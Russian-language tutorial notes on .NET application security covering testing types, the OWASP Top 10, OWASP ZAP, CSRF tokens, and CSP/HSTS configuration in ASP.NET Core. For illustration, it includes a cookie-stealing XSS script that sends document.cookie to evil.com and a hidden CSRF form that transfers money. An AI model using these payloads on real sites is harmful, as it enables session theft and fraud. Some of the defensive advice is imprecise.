Тестирование безопасности в .NET направлено на выявление уязвимостей, которые могут привести к утечке данных, несанкционированному доступу, SQL-инъекциям и другим атакам.

### **1️⃣ Виды тестирования безопасности**

🔹 **Статический анализ кода (SAST – Static Application Security Testing)**

- Проверяет код без его выполнения.
- Использует инструменты анализа кода (SonarQube, Snyk, CodeQL).

🔹 **Динамический анализ кода (DAST – Dynamic Application Security Testing)**

- Проверяет уязвимости в работающем приложении.
- Использует инструменты для симуляции атак (OWASP ZAP, Burp Suite).

🔹 **Интерактивный анализ безопасности (IAST – Interactive Application Security Testing)**

- Комбинирует SAST и DAST, анализируя запросы в реальном времени.
- Инструменты: Contrast Security, Seeker.

🔹 **Пентест (Penetration Testing)**

- Имитирует реальные атаки на систему.
- Часто выполняется вручную.

🔹 **Фаззинг (Fuzz Testing)**

- Автоматически генерирует случайные входные данные для выявления ошибок.
- Инструменты: Peach Fuzzer, Radamsa.

---

### **2️⃣ Распространенные уязвимости в .NET (OWASP Top 10)**

🛑 **1. SQL-инъекции** – внедрение SQL-кода через вводимые данные.  
✔️ **Решение**: Использовать **Parameterized Queries** или **Entity Framework**.

🛑 **2. XSS (Cross-Site Scripting)** – внедрение вредоносных скриптов в веб-приложение.  
✔️ **Решение**: Экранировать вводимые данные, использовать **AntiXSS**.

🛑 **3. CSRF (Cross-Site Request Forgery)** – выполнение запроса от имени пользователя без его ведома.  (См. ниже детальнее)
✔️ **Решение**: Использовать **CSRF-токены** в ASP.NET Core.

🛑 **4. Небезопасная аутентификация** – слабые пароли, отсутствие 2FA.  
✔️ **Решение**: Использовать **ASP.NET Identity**, настраивать **JWT** или **OAuth 2.0**.

🛑 **5. Разглашение конфиденциальных данных** – утечка паролей, API-ключей.  
✔️ **Решение**: Использовать **Secret Manager, Azure Key Vault**.

---

### **3️⃣ Инструменты для тестирования безопасности в .NET**

|Инструмент|Тип анализа|Описание|
|---|---|---|
|**OWASP ZAP**|DAST|Автоматический поиск уязвимостей в веб-приложениях.|
|**Burp Suite**|DAST|Интерактивное тестирование API и веб-приложений.|
|**SonarQube**|SAST|Анализирует код на уязвимости и кодстайл.|
|**Snyk**|SAST|Поиск уязвимостей в зависимостях NuGet.|
|**CodeQL**|SAST|Анализ кода с использованием запросов SQL-подобного синтаксиса.|
|**dotnet Security Audits**|SAST|Проверка зависимостей .NET на известные уязвимости.|

---

### **4️⃣ Практика: Как протестировать безопасность в .NET?**

#### **✅ Шаг 1: Проверка зависимостей (SCA – Software Composition Analysis)**

**Команда для проверки уязвимых пакетов:**

```sh
dotnet list package --vulnerable
```

(Показывает пакеты, содержащие уязвимости.)

#### **✅ Шаг 2: Анализ кода на уязвимости (SAST)**

**Запуск анализа с SonarQube:**

```sh
dotnet sonarscanner begin /k:"ProjectKey" /d:sonar.host.url="http://localhost:9000"
dotnet build
dotnet sonarscanner end
```

#### **✅ Шаг 3: Динамическое тестирование (DAST) с OWASP ZAP**

1. Запустить **OWASP ZAP** и ввести URL-адрес API или веб-приложения.
2. Использовать **Spider Scan** для обнаружения уязвимостей.

#### **✅ Шаг 4: Защита API от атак (CSRF, SQL-инъекции, XSS)**

Пример включения защиты от CSRF в ASP.NET Core:

```csharp
services.AddAntiforgery(options => 
{
    options.HeaderName = "X-CSRF-TOKEN";
});
```

---

### **5️⃣ Рекомендации по безопасности**

🔹 Всегда обновляйте зависимости (`dotnet outdated`).  
🔹 Используйте **HTTPS** и заголовки безопасности (Content-Security-Policy).  
🔹 Храните секретные данные в **Secret Manager, Azure Key Vault**.  
🔹 Включайте логирование и мониторинг (Serilog, Application Insights).  
🔹 Используйте безопасные методы авторизации (OAuth 2.0, OpenID Connect).

---

📌 **Заключение:**  
Тестирование безопасности в .NET – это комбинация разных методов: статический и динамический анализ, проверка зависимостей и имитация атак. Использование инструментов OWASP, SonarQube, Snyk и правильная настройка ASP.NET Core помогут защитить приложение от угроз.

---
## **🔐 OWASP (Open Web Application Security Project)**

### **1️⃣ Что такое OWASP?**

**OWASP (Open Web Application Security Project)** — это открытая международная организация, занимающаяся вопросами безопасности веб-приложений. Она разрабатывает **методологии, инструменты и стандарты** для защиты от кибератак.

OWASP предлагает бесплатные руководства, инструменты и отчёты, которые помогают разработчикам улучшить безопасность приложений.

---

### **2️⃣ OWASP Top 10 — Самые критичные уязвимости**

Каждые несколько лет OWASP публикует **OWASP Top 10** — список наиболее распространённых угроз веб-безопасности.

| **#**  | **Название**                                   | **Описание**                                                                                                  | **Как защититься?**                                                                      |
| ------ | ---------------------------------------------- | ------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------- |
| **1**  | **Broken Access Control**                      | Неправильные проверки прав доступа, позволяющие злоумышленнику получать доступ к данным других пользователей. | Использовать **авторизацию на уровне API и контроллеров**, минимизировать права доступа. |
| **2**  | **Cryptographic Failures**                     | Устаревшие или слабые алгоритмы шифрования.                                                                   | Использовать **AES-256, TLS 1.2+, Argon2** для хеширования паролей.                      |
| **3**  | **Injection (SQL, NoSQL, LDAP, etc.)**         | Внедрение вредоносного кода в запросы (SQL, NoSQL, XSS).                                                      | Использовать **параметризованные запросы (EF Core)**, библиотеку **HtmlEncoder**.        |
| **4**  | **Insecure Design**                            | Отсутствие принципов безопасной разработки.                                                                   | Применять **Threat Modeling, Secure SDLC**.                                              |
| **5**  | **Security Misconfiguration**                  | Ошибки конфигурации (разрешённые CORS, дебаг-режим).                                                          | Отключить дебаг-режим в проде, ограничивать **CORS**.                                    |
| **6**  | **Vulnerable and Outdated Components**         | Использование устаревших библиотек и зависимостей.                                                            | Обновлять **NuGet-пакеты** и использовать **Snyk**.                                      |
| **7**  | **Identification and Authentication Failures** | Ошибки аутентификации (слабые пароли, отсутствие 2FA).                                                        | Включить **ASP.NET Identity, JWT, OAuth 2.0**.                                           |
| **8**  | **Software and Data Integrity Failures**       | Вредоносные обновления или манипуляции с данными.                                                             | Проверять **хеш-суммы** файлов, использовать **подписанные пакеты NuGet**.               |
| **9**  | **Security Logging and Monitoring Failures**   | Отсутствие логов безопасности, что мешает выявлять атаки.                                                     | Использовать **Serilog, Application Insights**.                                          |
| **10** | **Server-Side Request Forgery (SSRF)**         | Злоумышленник заставляет сервер отправлять запросы на внешние ресурсы.                                        | Ограничивать исходящие HTTP-запросы, проверять URL-адреса.                               |

📌 **Подробнее:** [OWASP Top 10](https://owasp.org/www-project-top-ten/)

---

### **3️⃣ Инструменты OWASP для тестирования безопасности**

OWASP предлагает **инструменты**, которые помогают проверять безопасность веб-приложений:

|**Инструмент**|**Тип**|**Описание**|
|---|---|---|
|**OWASP ZAP (Zed Attack Proxy)**|DAST|Автоматическое и ручное тестирование безопасности веб-приложений.|
|**OWASP Dependency-Check**|SCA|Поиск уязвимостей в библиотеках .NET, Java, Python.|
|**OWASP Threat Dragon**|Threat Modeling|Инструмент для моделирования угроз в архитектуре приложения.|
|**OWASP Amass**|Reconnaissance|Сбор информации о доменах и инфраструктуре.|
|**OWASP CSRFGuard**|Security|Защита от атак CSRF в веб-приложениях.|

📌 **Подробнее:** [OWASP Tools](https://owasp.org/www-projects/)

---

### **4️⃣ OWASP ZAP: Практический анализ уязвимостей ASP.NET Core**

OWASP ZAP (Zed Attack Proxy) — это мощный инструмент для поиска уязвимостей в веб-приложениях.

#### **📌 Установка OWASP ZAP**

1. Скачать и установить с [официального сайта](https://www.zaproxy.org/download/).
2. Запустить OWASP ZAP.

#### **📌 Сканирование ASP.NET Core API**

1. **Запустить API**:
    
    ```sh
    dotnet run --urls "http://localhost:5000"
    ```
    
2. **Ввести URL API** в OWASP ZAP и нажать "Attack".
3. **Проанализировать отчёт** и исправить найденные уязвимости.

---

### **5️⃣ Как защитить .NET-приложение от атак OWASP Top 10?**

✅ **1. Защита от SQL-инъекций**  
Используйте **параметризованные запросы**:

```csharp
var user = dbContext.Users
    .Where(u => u.Email == email)
    .FirstOrDefault();
```

✅ **2. Защита от XSS (Cross-Site Scripting)**  
Используйте **HtmlEncoder** в Razor Pages:

```csharp
@Html.Raw(HtmlEncoder.Default.Encode(userInput))
```

✅ **3. Защита от CSRF (Cross-Site Request Forgery)**  -- см. ниже
Добавьте **Antiforgery Token** в ASP.NET Core:

```csharp
services.AddAntiforgery(options => 
{
    options.HeaderName = "X-CSRF-TOKEN";
});
```

✅ **4. Безопасная аутентификация**  
Используйте **ASP.NET Identity и JWT**:

```csharp
services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
    .AddJwtBearer(options =>
    {
        options.TokenValidationParameters = new TokenValidationParameters
        {
            ValidateIssuer = true,
            ValidateAudience = true,
            ValidateLifetime = true,
            ValidateIssuerSigningKey = true,
            ValidIssuer = "https://yourapp.com",
            ValidAudience = "https://yourapp.com",
            IssuerSigningKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes("your_secret_key"))
        };
    });
```

✅ **5. Использование безопасных заголовков**  
Добавьте **CSP и HSTS** (см. ниже детальнее) в `Startup.cs`:

```csharp
app.UseHsts();
app.UseHttpsRedirection();
app.Use(async (context, next) =>
{
    context.Response.Headers.Add("Content-Security-Policy", "default-src 'self'");
    context.Response.Headers.Add("X-Frame-Options", "DENY");
    context.Response.Headers.Add("X-Content-Type-Options", "nosniff");
    await next();
});
```

---

## **🔎 Итоги**

✅ **OWASP** – это набор стандартов и инструментов для защиты веб-приложений.  
✅ **OWASP Top 10** помогает избежать распространённых уязвимостей.  
✅ **OWASP ZAP, Dependency-Check, Threat Dragon** помогают тестировать безопасность в .NET.  
✅ **Лучшие практики безопасности** включают обновление зависимостей, защиту API, безопасное хранение данных и логирование.

📌 **Дополнительные материалы:**  
🔗 [OWASP Official Site](https://owasp.org/)  
🔗 [OWASP ZAP](https://www.zaproxy.org/)  
🔗 [OWASP Dependency-Check](https://jeremylong.github.io/DependencyCheck/)  
🔗 [OWASP Top 10 Guide](https://owasp.org/www-project-top-ten/)

---
---
---

## **🔐 CSRF-токены в .NET Core**

### **1️⃣ Что такое CSRF?**

**CSRF (Cross-Site Request Forgery, межсайтовая подделка запроса)** — это атака, при которой злоумышленник заставляет пользователя выполнить **нежелательный запрос** к сайту, на котором он уже **авторизован**.

🔴 **Пример атаки CSRF:**

1. Пользователь авторизован в банковском сервисе (`bank.com`).
2. Злоумышленник отправляет пользователю ссылку на поддельный сайт (`hacker.com`).
3. На `hacker.com` есть скрытая форма:
    
    ```html
    <form action="https://bank.com/transfer" method="POST">
        <input type="hidden" name="toAccount" value="Hacker123">
        <input type="hidden" name="amount" value="1000">
        <input type="submit" value="Click me!">
    </form>
    ```
    
4. Если пользователь нажмет кнопку или скрипт отправит форму автоматически, деньги переведутся без его ведома.

📌 **Почему это работает?** Браузер **автоматически отправляет куки** с сессией пользователя, поэтому сервер думает, что запрос идёт от владельца аккаунта.

---

### **2️⃣ Что такое CSRF-токен и как он защищает?**

CSRF-токен (Anti-CSRF Token) — это **уникальный случайный ключ**, который сервер создаёт и отправляет клиенту. Этот токен добавляется в форму или заголовки запроса и проверяется сервером.

📌 **Как работает защита с CSRF-токенами?**

1. При загрузке страницы сервер **генерирует CSRF-токен** и передает его в форму.
2. Когда пользователь отправляет форму, **токен передается вместе с запросом**.
3. **Сервер проверяет токен** перед обработкой запроса.
4. Если токен отсутствует или неверный — **запрос отклоняется**.

---

### **3️⃣ CSRF-защита в .NET Core**

#### **✅ Включение защиты CSRF в ASP.NET Core**

В `Program.cs` или `Startup.cs` добавьте:

```csharp
services.AddAntiforgery(options =>
{
    options.HeaderName = "X-CSRF-TOKEN"; // Заголовок для передачи токена
});
```

#### **✅ Добавление CSRF-токена в Razor Pages (Frontend)**

В Razor Pages формы получают CSRF-токен автоматически через `@Html.AntiForgeryToken()`:

```html
<form asp-controller="Account" asp-action="Transfer" method="post">
    <input type="hidden" name="toAccount" value="Hacker123">
    <input type="hidden" name="amount" value="1000">
    @Html.AntiForgeryToken()
    <button type="submit">Перевести деньги</button>
</form>
```

🔹 **Что делает `@Html.AntiForgeryToken()`?**

- Создаёт скрытое поле `<input type="hidden" name="__RequestVerificationToken" value="...">`.
- Генерирует **уникальный токен** для формы.

---

### **4️⃣ CSRF-защита в API (SPA, AJAX, JavaScript)**

🔹 Для API нельзя использовать скрытые поля формы, поэтому токен передаётся **в заголовке запроса**.

#### **✅ Добавление CSRF-токена в `Program.cs` (ASP.NET Core 6+)**

```csharp
app.Use(async (context, next) =>
{
    var tokens = context.RequestServices.GetRequiredService<IAntiforgery>().GetAndStoreTokens(context);
    context.Response.Cookies.Append("XSRF-TOKEN", tokens.RequestToken!, new CookieOptions { HttpOnly = false });
    await next();
});
```

🚀 **Что делает этот код?**

- Создаёт CSRF-токен и сохраняет его в **cookie (XSRF-TOKEN)**.
- Доступен **в JavaScript (HttpOnly = false)**, но **нельзя отправлять через куки автоматически**.

#### **✅ Проверка CSRF-токена в API**

Добавьте `[ValidateAntiForgeryToken]` в контроллер:

```csharp
[HttpPost]
[ValidateAntiForgeryToken]
public IActionResult Transfer([FromBody] TransferRequest request)
{
    // Обработка перевода денег
    return Ok("Transfer successful");
}
```

#### **✅ Передача CSRF-токена в API-запросе (JavaScript, Fetch)**

```js
async function sendMoney() {
    const response = await fetch('/transfer', {
        method: 'POST',
        headers: {
            'X-CSRF-TOKEN': document.cookie.replace(/(?:(?:^|.*;\s*)XSRF-TOKEN\s*=\s*([^;]*).*$)|^.*$/, "$1"),
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ toAccount: "Hacker123", amount: 1000 })
    });

    const result = await response.json();
    console.log(result);
}
```

🚀 **Как это работает?**

1. JavaScript **извлекает CSRF-токен** из cookie.
2. Добавляет его в заголовок `X-CSRF-TOKEN`.
3. Сервер **сравнивает токен** с тем, что он создал ранее.

---

### **5️⃣ Когда CSRF-защита не нужна?**

CSRF-токены **не требуются**, если:  
✅ API использует **только авторизацию через JWT (Bearer-токены)**, потому что **браузер не отправляет токены автоматически**.  
✅ Все запросы **идемпотентные (GET, HEAD, OPTIONS)**.

Но если API использует **куки для аутентификации**, CSRF-токены **нужны**!

---

### **6️⃣ Альтернативные методы защиты от CSRF**

📌 **1. Проверка реферера (Referer Header)**  
Если сайт `evil.com` пытается отправить запрос на `bank.com`, браузер передаст `Referer: evil.com`.  
**Проблема**: Referer можно подделать.

📌 **2. SameSite Cookies**  
Позволяет браузеру **не отправлять куки с межсайтовыми запросами**.  
В `Program.cs` можно включить:

```csharp
services.ConfigureApplicationCookie(options =>
{
    options.Cookie.SameSite = SameSiteMode.Strict;
});
```

**Проблема**: Работает **не во всех браузерах** и не защищает API.

📌 **3. OAuth2, JWT вместо куков**  
JWT-токены **не передаются браузером автоматически**, поэтому CSRF невозможен.

---

## **📌 Выводы**

✅ **CSRF-атака** позволяет отправлять вредоносные запросы от имени пользователя.  
✅ **CSRF-токен** защищает, требуя уникальный ключ в каждом POST-запросе.  
✅ **ASP.NET Core** поддерживает CSRF-защиту через `@Html.AntiForgeryToken()`.  
✅ **API-защита** требует передачи CSRF-токена в заголовке `X-CSRF-TOKEN`.  
✅ **JWT-аутентификация** исключает риск CSRF, так как токен не отправляется автоматически.

---
---
---
## **🔐 CSP и HSTS: Защита веб-приложений**

### **1️⃣ Content Security Policy (CSP) – Политика безопасности контента**

**CSP (Content Security Policy)** — это HTTP-заголовок, который **защищает сайт от XSS-атак (межсайтового скриптинга)**, ограничивая загрузку и выполнение ресурсов (JavaScript, CSS, изображений и т. д.).

### **🔴 Как работает XSS (Cross-Site Scripting)?**

Злоумышленник вставляет вредоносный JavaScript-код в ваш сайт, например:

```html
<script>fetch('http://evil.com/steal?cookie=' + document.cookie)</script>
```

📌 **Если CSP не настроен**, браузер выполнит этот код, и злоумышленник украдёт куки.

---

### **✅ Как работает CSP?**

CSP **блокирует выполнение** JavaScript, если он не соответствует политике.

🔹 **Пример заголовка CSP:**

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://apis.google.com
```

🔹 **Что делает этот заголовок?**

- `default-src 'self'` → Разрешает загрузку контента **только с текущего домена**.
- `script-src 'self' https://apis.google.com` → **Разрешает JavaScript** только с текущего сайта и Google API.
- **Вредоносный JavaScript не загрузится!**

---

### **✅ Включение CSP в .NET Core**

В `Program.cs` добавьте CSP-заголовки:

```csharp
app.Use(async (context, next) =>
{
    context.Response.Headers.Append("Content-Security-Policy", 
        "default-src 'self'; script-src 'self' https://apis.google.com");
    await next();
});
```

📌 **Браузер теперь блокирует XSS-атаки!**

---

### **🔹 Полезные политики CSP**

|Директива|Описание|
|---|---|
|`default-src 'self'`|Разрешает контент только с этого сайта.|
|`script-src 'self' 'unsafe-inline'`|Разрешает JS с этого сайта (и инлайн-код, но это небезопасно).|
|`img-src 'self' data:`|Разрешает картинки с этого сайта и `data:` URI.|
|`style-src 'self' 'unsafe-inline'`|Разрешает CSS, но `unsafe-inline` не рекомендуется.|

📌 **Важно!** Никогда не используйте `'unsafe-inline'` для JS — это снижает защиту.

---

## **2️⃣ HSTS (HTTP Strict Transport Security) – Политика строгой транспортной безопасности**

**HSTS (HTTP Strict Transport Security)** — заголовок, который **заставляет браузер использовать только HTTPS** и запрещает HTTP-запросы.

### **🔴 Проблема без HSTS**

Допустим, пользователь заходит на `http://example.com`.  
Если атакующий **перехватит соединение**, он может **подменить страницу** и украсть данные.

📌 **HSTS предотвращает это!**

---

### **✅ Как работает HSTS?**

HSTS заставляет браузер **автоматически перенаправлять HTTP → HTTPS**.  
📌 **Пример заголовка:**

```http
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

🔹 **Что делает этот заголовок?**

- `max-age=31536000` → Запоминает HSTS на **1 год**.
- `includeSubDomains` → Распространяет на **все поддомены**.
- `preload` → Добавляет сайт в **список HSTS-браузеров**.

---

### **✅ Включение HSTS в .NET Core**

В `Program.cs` добавьте:

```csharp
app.UseHsts();
```

📌 Теперь браузер **всегда использует HTTPS** для этого домена.

---

### **3️⃣ Разница между CSP и HSTS**

|Заголовок|Что делает?|Защита от?|
|---|---|---|
|**CSP** (Content Security Policy)|Ограничивает загрузку JavaScript, CSS, изображений.|XSS-атак, подмены скриптов.|
|**HSTS** (HTTP Strict Transport Security)|Запрещает HTTP, заставляет браузер использовать HTTPS.|Перехвата соединения (MITM).|

---

## **📌 Итог**

✅ **CSP** защищает от XSS-атак, запрещая загрузку вредоносных скриптов.  
✅ **HSTS** запрещает HTTP-соединения и заставляет браузер использовать HTTPS.  
✅ В .NET Core их легко включить через **Middleware (UseHsts) и заголовки (CSP)**.
